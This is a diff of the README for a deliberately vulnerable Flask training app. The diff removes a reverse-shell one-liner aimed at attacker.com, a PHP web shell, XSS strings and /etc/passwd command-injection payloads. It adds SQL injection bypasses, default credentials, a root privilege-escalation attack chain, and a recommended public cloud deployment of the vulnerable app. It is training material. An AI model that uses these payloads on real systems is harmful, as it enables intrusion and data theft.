@@ -1,25 +1,55 @@
-# Vulnerable Web Application Demo
+# Vulnerable Web Application Demo with Privilege Escalation
 
-This Flask web application was intentionally designed with security vulnerabilities for educational purposes. It demonstrates common web security issues according to the OWASP Top 10.
+This Flask web application was intentionally designed with security vulnerabilities for educational and demonstration purposes. It demonstrates common web security issues according to the OWASP Top 10 and provides a complete attack chain from initial exploitation to privilege escalation.
 
-## ⚠️ Warning
+## ⚠️ Warning ⚠️
 
 **This application is intentionally vulnerable and should only be used in a controlled environment for educational purposes.**
 
-**DO NOT deploy this application in a production environment or use it with real user data.**
+**DO NOT deploy this application in a production environment, expose it to the public internet, or use it with real user data.**
 
 ## Included Vulnerabilities
 
+### Web Application Vulnerabilities
 1. **SQL Injection**: The login form is vulnerable to SQL injection attacks.
 2. **Cross-Site Scripting (XSS)**: The comments section allows execution of arbitrary JavaScript.
 3. **Insecure Direct Object References (IDOR)**: User profiles can be accessed by manipulating URL parameters.
 4. **Path Traversal**: File upload functionality allows saving files to unauthorized locations.
 5. **Command Injection**: Admin tools allow executing arbitrary system commands.
-6. **Hidden Flag**: A flag file is placed in a restricted directory for CTF-style challenges.
-7. **Security Misconfiguration**: The application runs in debug mode and has other security misconfigurations.
-8. **Password Storage**: Passwords are stored as plaintext in the database.
+6. **Security Misconfiguration**: The application runs in debug mode and has other security misconfigurations.
+7. **Sensitive Data Exposure**: Passwords are stored in plaintext in the database.
+
+### Privilege Escalation Vectors
+1. **Vulnerable Backup Script**: The backup script can be exploited through command injection.
+2. **SUID Binaries**: Common binaries are configured with SUID permissions.
+3. **Sudo Privileges**: The www-data user has sudo privileges for certain commands without a password.
+4. **Sensitive Files**: Hidden credentials files are available for discovery.
 
 ## Setup Instructions
+
+### Option 1: Deploy to Cloud (Recommended)
+
+Use the provided deployment script to deploy to Azure:
+
+```
+./deploy-app.sh
+```
+
+This will:
+- Build the Docker container
+- Push it to Azure Container Registry
+- Deploy to Azure Container Instances
+- Provide you with a unique URL to access the application
+
+### Option 2: Running with Docker Locally
+
+```
+docker-compose -f docker-compose.prod.yml up -d --build
+```
+
+Access the application at http://localhost:5000
+
+### Option 3: Running Locally
 
 1. Create a virtual environment:
    ```
@@ -32,108 +62,67 @@ This Flask web application was intentionally designed with security vulnerabilit
    pip install -r requirements.txt
    ```
 
-3. Run the application:
+3. Run the application (with sudo for full privilege escalation functionality):
    ```
-   python app.py
+   sudo python app.py
    ```
 
 4. Access the application at http://127.0.0.1:5000
 
-## Deployment Options
+## Database Information
 
-### Docker Deployment
+The application uses SQLite for its database:
+- A fresh database is created each time the application starts
+- Sample users are automatically created with credentials:
+  - Username: `admin`, Password: `admin123` (admin user)
+  - Username: `john`, Password: `password123` (regular user)
+  - Username: `user`, Password: `welcome123` (regular user)
 
-This application comes with Docker configuration files for easy deployment:
+### SQL Injection Techniques
 
-1. **Development Deployment**:
-   ```bash
-   docker-compose up -d
-   ```
+The login form is vulnerable to several SQL injection techniques:
 
-2. **Production Deployment**:
-   ```bash
-   # Set a secure secret key
-   export SECRET_KEY="your_secure_secret_key_here"
+1. **Basic Authentication Bypass**:
+   - Username: `' OR '1'='1` (with any password)
+   - Username: `' OR 1=1 --` (with any password)
    
-   # Build and run the production container
-   docker-compose -f docker-compose.prod.yml up -d
-   ```
+2. **Admin Access**:
+   - Username: `admin' --` (with any password)
 
-3. **Deploy to Cloud Platforms**:
-   - **AWS ECS**: Push your image to ECR and deploy using ECS
-   - **Google Cloud Run**: Push your image to GCR and deploy as a Cloud Run service
-   - **Azure Container Instances**: Push your image to ACR and deploy to ACI
-   - **Digital Ocean App Platform**: Connect your repo and use the Dockerfile.prod
+When these SQL injections work, they log you in as the first user in the database (typically the admin user).
 
-### Vercel Deployment
+The query sent to the database would look like:
+```sql
+-- For "' OR '1'='1":
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
 
-To deploy on Vercel:
+-- For "admin' --":
+SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
+```
 
-1. Install Vercel CLI:
-   ```bash
-   npm install -g vercel
-   ```
+## Complete Attack Chain Demonstration
 
-2. Add a `vercel.json` file to the repository
-   
-3. Deploy using Vercel CLI:
-   ```bash
-   vercel
-   ```
+The application facilitates a complete attack chain demonstration:
 
-## Exploitation Examples
+1. **Initial Access**: Exploit web vulnerabilities (SQL injection, path traversal)
+2. **Reverse Shell**: Upload and execute a PHP reverse shell
+3. **Discovery**: Find sensitive files and hidden flags
+4. **Privilege Escalation**: Use the configured vectors to gain root access
+5. **Capture the Flag**: Find and capture the root flag
 
-### SQL Injection
-- Username: `' OR '1'='1` with any password
-- Username: `admin' --` with any password
+## Demo Environment Features
 
-### XSS (Cross-Site Scripting)
-Post a comment with:
-- `<script>alert('XSS');</script>`
-- `<img src="x" onerror="alert('XSS')">`
+- **Interactive Demo Page**: Visit `/demo-info` to view available vulnerabilities and privilege escalation methods
+- **User Flag**: Located at `restricted/flag.txt`
+- **Root Flag**: Located at `/root/root_flag.txt` (only accessible after privilege escalation)
+- **Multiple Privilege Escalation Paths**: Choose from various methods including backup script injection, SUID binaries, and sudo permissions
 
-### IDOR (Insecure Direct Object References)
-- Navigate to `/profile/1`, `/profile/2`, etc., without proper authorization
+## Educational Purpose
 
-### Path Traversal
-- Upload a file with subdirectory path: `../restricted`
-- This bypasses access controls and allows writing to arbitrary directories
+This application is designed for:
+- Cybersecurity training and demonstrations
+- Penetration testing practice
+- Educational workshops on web security
+- Learning about privilege escalation techniques
 
-### Command Injection
-Use commands like:
-- `ping 127.0.0.1 && whoami`
-- `ping 127.0.0.1; cat /etc/passwd`
-- `ping 127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`
-
-### Reverse Shell Examples
-1. Create a reverse shell file (e.g., shell.php):
-   ```php
-   <?php system($_GET['cmd']); ?>
-   ```
-
-2. Upload to an accessible location using path traversal
-
-3. Access the shell: `/uploads/shell.php?cmd=whoami`
-
-## Capture The Flag
-
-Find and access the hidden flag file in the restricted directory. Hint: It's at `/restricted/flag.txt` but requires either:
-- Admin access
-- Path traversal through the file upload vulnerability
-
-## Learning Resources
-
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-
-## How to Fix These Vulnerabilities
-
-Each vulnerability has a secure alternative:
-
-1. **SQL Injection**: Use parameterized queries or an ORM
-2. **XSS**: Sanitize user input and use proper escaping
-3. **IDOR**: Implement proper access controls
-4. **Path Traversal**: Validate and sanitize file paths, use secure file storage
-5. **Command Injection**: Never use user input directly in system commands
-6. **Security Misconfiguration**: Turn off debug mode in production, implement proper error handling
-7. **Password Storage**: Use password hashing with a strong algorithm (bcrypt, Argon2) 
+Remember to practice ethical hacking and only use these techniques in controlled, authorized environments. 
